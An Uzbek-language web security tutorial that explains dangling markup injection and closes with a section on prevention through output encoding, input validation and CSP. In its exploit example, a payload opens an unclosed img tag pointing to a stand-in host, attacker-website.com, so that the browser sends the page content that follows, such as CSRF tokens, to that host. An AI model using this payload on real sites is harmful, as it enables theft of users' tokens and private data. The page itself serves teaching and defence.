# Dangling markup

Ushbu bo'limda Dangling markup ineksiya nima ekanligi haqida, oddiy exploitlarni qanday amalga oshirish mumkinligi haqida va dangling markup xujumlarini oldini olish haqida gaplashamiz.

## <mark style="color:yellow;">Dangling Markup ineksiya nima?</mark> <a href="#dangling-markup-inektsiya-nima" id="dangling-markup-inektsiya-nima"></a>

Dangling markup ineksiya bu XSSni ishlatish mumkin bo'lmagan joylardagi domenlararo ma'lumotni ushlash uchun ishlatiladigan usul.

Faraz qilaylik, web sayt haker tomonidan boshqariladigan maʼlumotlarni oʻz javoblariga xavfli tarzda joylashtiradi:

{% code overflow="wrap" %}
```html
<input type="text" name="input" value="boshqariladigan ma'lumot
```
{% endcode %}

Faraz qilaylik, web sayt > yoki " belgilarni filtrlamaydi yoki chetlab o‘tmaydi. Haker kiritgan atribut qiymati va qo‘shuvchi tegdan chiqib ketish va HTML kontekstiga qaytish uchun quyidagi sintaksisdan foydalanishi mumkin:

```
">
```

```
"><img src='//attacker-website.com?
```

Ushbu payload `img` tegini yaratadi va haker serveridagi URL manzilini o'z ichiga olgan `src` atributining boshlanishini bildiradi. Esda tutingki Haker o'zining payloadidagi `src` atributini ohirini yopmadi. Brauzer javobni tahlil qilganda, atributni tugatish uchun birtirnoq belgisiga duch kelmaguncha harakat qilaveradi.  Bu belgigacha bo'lgan barcha narsalar URLning bir qismi sifatida ko'rib chiqiladi va URL so'rovlar qatori ichida Haker serveriga yuboriladi. Har qanday alphanumeric bo'lmagan belgilar, ayniqsa yangi qatorlar URL-encoding bo'ladi.

Hujum natijasi shundaki, Haker maxfiy ma'lumotlarni o'z ichiga olishi mumkin bo'lgan ineksiya qismidan keyin web sayt javobining bir qismini qo'lga kiritishi mumkin. Web saytning funksionalligiga qarab, bu <mark style="color:yellow;">**CSRF**</mark> tokenlari, elektron pochta xabarlari yoki moliyaviy ma'lumotlarni o'z ichiga olishi mumkin.

Tashqi so'rovni amalga oshiradigan har qanday atribut <mark style="color:yellow;">**dangling markup**</mark> uchun ishlatilishi mumkin.

Keyingi laboratoriyani bajarish qiyin, chunki barcha tashqi so'rovlar bloklangan. Biroq, ma'lumotlarni saqlash va tashqi serverdan keyinroq olish imkonini beruvchi ba'zi teglar mavjud.

{% hint style="warning" %}
<mark style="color:yellow;">**Lab:**</mark> [Juda qatiy SCP bilan himoyalangan dangling markup hujimi orqali Reflected XSS  ≫](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)
{% endhint %}

## <mark style="color:yellow;">Dangling Markup xujumlarini qanday oldini olish mumkin?</mark> <a href="#dangling-markup-xujumlarini-qanday-oldini-olish-mumkin" id="dangling-markup-xujumlarini-qanday-oldini-olish-mumkin"></a>

Siz dangling markup xujumlarini XSSga qarshi himoyadagidek ximoyalanishingiz mumkin, ya'ni chiqayotgan ma'lumotni kodlab va kelayotgan ma'lumotlarni tekshirib.

Bundan tashqari, <mark style="color:yellow;">Content Security Policy</mark> (CSP) yordamida ba'zi dangling markup hujumlarining tasirini kamaytira olasiz. Misol uchun, `img` kabi teglarning tashqi resurslarni yuklashiga to'sqinlik qiluvchi siyosatdan foydalanib, ba'zi (ammo hammasini emas) hujumlarning oldini olishingiz mumkin.
